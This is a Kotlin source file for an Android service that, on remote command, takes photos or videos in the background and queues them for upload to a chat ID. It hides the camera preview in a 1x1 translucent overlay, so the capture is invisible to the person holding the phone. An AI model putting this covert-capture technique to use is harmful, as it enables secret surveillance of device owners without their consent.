package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Environment
import android.os.IBinder
import android.util.Log
import android.view.SurfaceView
import android.view.WindowManager
import kotlinx.coroutines.*
import java.io.File

class CameraService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_TYPE = "type"
        const val EXTRA_CAMERA = "camera"
        const val EXTRA_FLASH = "flash"
        const val EXTRA_QUALITY = "quality"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(
            context: Context,
            type: String,
            camera: String,
            flash: Boolean,
            quality: Int?,
            duration: Int?,
            chatId: String?
        ) {
            val intent = Intent(context, CameraService::class.java).apply {
                putExtra(EXTRA_TYPE, type)
                putExtra(EXTRA_CAMERA, camera)
                putExtra(EXTRA_FLASH, flash)
                quality?.let { putExtra(EXTRA_QUALITY, it) }
                duration?.let { putExtra(EXTRA_DURATION, it) }
                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
            }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val type = intent?.getStringExtra(EXTRA_TYPE) ?: "photo"
        val camera = intent?.getStringExtra(EXTRA_CAMERA) ?: "rear"
        val flash = intent?.getBooleanExtra(EXTRA_FLASH, false) ?: false
        val quality = intent?.getIntExtra(EXTRA_QUALITY, 720) ?: 720
        val duration = intent?.getIntExtra(EXTRA_DURATION, 60) ?: 60
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)

        scope.launch {
            try {
                val winMgr = getSystemService(WINDOW_SERVICE) as WindowManager
                val surfaceView = SurfaceView(this@CameraService)
                val lp = WindowManager.LayoutParams(
                    1, 1,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    android.graphics.PixelFormat.TRANSLUCENT
                )
                withContext(Dispatchers.Main) {
                    winMgr.addView(surfaceView, lp)
                }
                val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}")
                CameraBackgroundHelper.takePhotoOrVideo(
                    this@CameraService,
                    surfaceView.holder,
                    type,
                    camera,
                    flash,
                    quality,
                    duration,
                    file
                )
                withContext(Dispatchers.Main) {
                    winMgr.removeView(surfaceView)
                }
                Log.d("CameraService", "Saved $type to ${file.absolutePath}")
                if (chatId != null) {
                    UploadManager.queueUpload(file, chatId, type)
                }
            } catch (e: Exception) {
                Log.e("CameraService", "Error: $e")
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}